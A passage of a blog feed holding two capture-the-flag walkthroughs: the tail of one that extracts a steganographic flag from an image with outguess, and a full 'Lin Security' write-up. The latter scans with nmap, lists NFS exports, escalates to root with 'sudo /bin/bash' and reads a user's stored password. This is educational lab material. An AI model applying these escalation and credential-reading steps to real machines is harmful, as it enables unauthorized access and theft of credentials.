root         65 Jun  7 21:56 hash.txtdrwxrwxr-x 3 blacklight blacklight 4096 Jun  7 22:27 .local-rw-r--r-- 1 blacklight blacklight  666 Jun  7 21:27 .profiledrwxr-xr-x 2 root       root       4096 Jun  7 22:14 .secret-rw-r--r-- 1 blacklight blacklight    0 Jun  7 21:01 .sudo_as_admin_successfulroot@blacklight:/home/blacklight# cd .secretcd .secretroot@blacklight:/home/blacklight/.secret# ls -latotal 28drwxr-xr-x 2 root       root        4096 Jun  7 22:14 .drwxr-xr-x 6 blacklight blacklight  4096 Jun  7 23:49 ..-rw-r--r-- 1 root       root       19080 Jun  7 22:13 flag2-inside.jpg</code></pre><h2 id="The-second-flag"><a href="#The-second-flag" class="headerlink" title="The second flag"></a>The second flag</h2><p>I found a picture in a hidden directory,<br>which I moved to the web server directory …</p><pre><code>root@blacklight:/home/blacklight/.secret# cd /var/www/htmlroot@blacklight:/var/www/html# ls404.html         css        flag2-inside.jpg  footer  index.html  robots.txtblacklight.dict  flag1.txt  fonts             img     jsroot@blacklight:/var/www/html#</code></pre><p>and downloaded it:</p><pre><code>root@kali:~/Downloads# wget 192.168.43.246/flag2-inside.jpg[http://192.168.43.246/flag2-inside.jpg](http://192.168.43.246/flag2-inside.jpg)Connecting to 192.168.43.246:80... connected.HTTP request sent, awaiting response... 200 OKLength: 19080 (19K) [image/jpeg]Saving to: ‘flag2-inside.jpg’flag2-inside.jpg      100%[========================&gt;]  18.63K  --.-KB/s    in 0s(492 MB/s) - ‘flag2-inside.jpg’ saved [19080/19080]</code></pre><p><img src="https://cdn-images-1.medium.com/max/2000/1*M_ICC074csyR_m2Rrsyphg.png" alt="flag2-inside.jpg"></p><p>I forgot to mention that I saw some commands in the .bash_history file related to how this flag was constructed by the creator. Alright, the hint was pretty clear. I installed the outguess program and used the -r switch to retrieve the message and supplied the image and an output file called flag2.txt.</p><pre><code>root@kali:~/Downloads# outguess -r flag2-inside.jpg flag2.txtReading flag2-inside.jpg....Extracting usable bits:   18496 bitsSteg retrieve: seed: 180, len: 133</code></pre><p>The final flag was:</p><blockquote><p>{flag2:88ea7554cbc7e89526943e9ad5d3ce2ed5ec3db4}</p></blockquote><h2 id="Before-you-go"><a href="#Before-you-go" class="headerlink" title="Before you go"></a>Before you go</h2><p>If you found this article helpful, please share to help others with similar interest find it! + Feedback and donations are always welcome!</p><p><br><div align="center" class="addthis_inline_share_toolbox"></div><br></p>]]></content>
      
      
      <categories>
          
          <category> CTF Walkthroughs </category>
          
      </categories>
      
      
        <tags>
            
            <tag> vulnhub </tag>
            
            <tag> ctf </tag>
            
            <tag> walkthrough </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Lin Security Walkthrough</title>
      <link href="/2018/11/15/Lin-Security-Walkthrough/"/>
      <url>/2018/11/15/Lin-Security-Walkthrough/</url>
      
        <content type="html"><![CDATA[<script type="text/javascript" src="//s7.addthis.com/js/300/addthis_widget.js#pubid=ra-5bf72b3154516f79"></script><p><img src="lin_security_walkthrough.png" alt></p><h1 id="Description"><a href="#Description" class="headerlink" title="Description"></a>Description</h1><p>Here at in.security we wanted to develop a Linux virtual machine that is based, at the time of writing, on an up-to-date Ubuntu distro (18.04 LTS), but suffers from a number of vulnerabilities that allow a user to escalate to root on the box. This has been designed to help understand how certain built-in applications and services if misconfigured, may be abused by an attacker.</p><p>We have configured the box to simulate real-world vulnerabilities (albeit on a single host) which will help you to perfect your local privilege escalation skills, techniques and toolsets. There are a number challenges which range from fairly easy to intermediate level and we’re excited to see the methods you use to solve them!</p><p>The image is just under 1.7 GB and can be downloaded using the link above. On opening the OVA file a VM named lin.security will be imported and configured with a NAT adapter, but this can be changed to bridged via the the preferences of your preferred virtualisation platform.</p><p>To get started you can log onto the host with the credentials: bob/secret</p><h2 id="Port-scanning"><a href="#Port-scanning" class="headerlink" title="Port scanning"></a>Port scanning</h2><p>The nmap port scan resulted in the following output:</p><pre><code>root@kali:~# nmap -A -p 1-65535 192.168.43.150Nmap scan report for linsecurity (192.168.43.150)Host is up (0.00020s latency).Not shown: 65528 closed portsPORT      STATE SERVICE  VERSION22/tcp    open  ssh      OpenSSH 7.6p1 Ubuntu 4 (Ubuntu Linux; protocol 2.0)| ssh-hostkey:|   2048 7a:9b:b9:32:6f:95:77:10:c0:a0:80:35:34:b1:c0:00 (RSA)|   256 24:0c:7a:82:78:18:2d:66:46:3b:1a:36:22:06:e1:a1 (ECDSA)|_  256 b9:15:59:78:85:78:9e:a5:e6:16:f6:cf:96:2d:1d:36 (ED25519)111/tcp   open  rpcbind  2-4 (RPC #100000)| rpcinfo:|   program version   port/proto  service|   100000  2,3,4        111/tcp  rpcbind|   100000  2,3,4        111/udp  rpcbind|   100003  3           2049/udp  nfs|   100003  3,4         2049/tcp  nfs|   100005  1,2,3      48327/udp  mountd|   100005  1,2,3      60531/tcp  mountd|   100021  1,3,4      35925/tcp  nlockmgr|   100021  1,3,4      55354/udp  nlockmgr|   100227  3           2049/tcp  nfs_acl|_  100227  3           2049/udp  nfs_acl2049/tcp  open  nfs_acl  3 (RPC #100227)35925/tcp open  nlockmgr 1-4 (RPC #100021)50119/tcp open  mountd   1-3 (RPC #100005)52467/tcp open  mountd   1-3 (RPC #100005)60531/tcp open  mountd   1-3 (RPC #100005)MAC Address: 08:00:27:A3:D2:FD (Oracle VirtualBox virtual NIC)Device type: general purposeRunning: Linux 3.X|4.XOS CPE: cpe:/o:linux:linux_kernel:3 cpe:/o:linux:linux_kernel:4OS details: Linux 3.2 - 4.9Network Distance: 1 hopService Info: OS: Linux; CPE: cpe:/o:linux:linux_kernelTRACEROUTEHOP RTT     ADDRESS1   0.20 ms linsecurity (192.168.43.150)</code></pre><p>It looks like, there’s a shared network filesystem…</p><pre><code>root@kali:~# showmount -e 192.168.43.150Export list for 192.168.43.150:/home/peter *</code></pre><p>As you can see, peter’s home folder was shared, but after mounting, I couldn’t find anything interesting. The creator of the machine provided a username and a password to log in. So, let’s use it!</p><pre><code>root@kali:~# ssh bob@192.168.43.150bob@192.168.43.150&apos;s password:Welcome to lin.security | [https://in.security](https://in.security) | version 1.0bob@linsecurity:~$</code></pre><div class="addthis_tipjar_inline"></div><h2 id="Enumeration"><a href="#Enumeration" class="headerlink" title="Enumeration"></a>Enumeration</h2><p>As for enumeration, I checked bob’s privileges:</p><pre><code>bob@linsecurity:~$ sudo -l[sudo] password for bob:Matching Defaults entries for bob on linsecurity:    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/binUser bob may run the following commands on linsecurity:    (ALL) /bin/ash, /usr/bin/awk, /bin/bash, /bin/sh, /bin/csh, /usr/bin/curl, /bin/dash, /bin/ed, /usr/bin/env, /usr/bin/expect, /usr/bin/find, /usr/bin/ftp,        /usr/bin/less, /usr/bin/man, /bin/more, /usr/bin/scp, /usr/bin/socat, /usr/bin/ssh, /usr/bin/vi, /usr/bin/zsh, /usr/bin/pico, /usr/bin/rvim, /usr/bin/perl,        /usr/bin/tclsh, /usr/bin/git, /usr/bin/script, /usr/bin/scp</code></pre><h2 id="Getting-root-access"><a href="#Getting-root-access" class="headerlink" title="Getting root access"></a>Getting root access</h2><p>We have the ability run a bunch of things as root, without actually knowing the root password. Probably the most convenient solution is to run the bash program as root.</p><pre><code>bob@linsecurity:~$ sudo /bin/bashroot@linsecurity:~# whoamiroot</code></pre><p>At this point the challenge was over, but I checked out susan’s home directory and found a .secret file.</p><pre><code>root@linsecurity:/home/susan# ls -latotal 32drwxr-xr-x 4 susan susan 4096 Aug  6 21:38 .drwxr-xr-x 5 root  root  4096 Jul  9 19:58 ..-rw-r--r-- 1 susan susan  220 Jul  9 19:58 .bash_logout-rw-r--r-- 1 susan susan 3771 Jul  9 19:58 .bashrcdrwx------ 2 susan susan 4096 Aug  6 21:38 .cachedrwx------ 3 susan susan 4096 Aug  6 21:38 .gnupg-rw-r--r-- 1 susan susan  807 Jul  9 19:58 .profile-rw-r--r-- 1 susan susan   20 Jul  9 19:57 .secretroot@linsecurity:/home/susan# cat .secretMySuperS3cretValue!</code></pre><p>It turned out, it was her SSH password…</p><h2 id="Before-you-go"><a href="#Before-you-go" class="headerlink" title="Before you go"></a>Before you go</h2><p>If you found this article helpful, please share to help others with similar interest find it! + Feedback and donations are always welcome!</p><p><br><div align="center" class="addthis_inline_share_toolbox"></div><br></p>]]></content>
      
      
      <categories>
          
          <category> CTF Walkthroughs </category>
          
      </categories>
      
      
        <tags>
            
            <tag> vulnhub </tag>
            
            <tag> ctf </tag>
            
            <tag> walkthrough </tag>
            
        </tags>
      
    </entry>
    
    
  
  
</search>
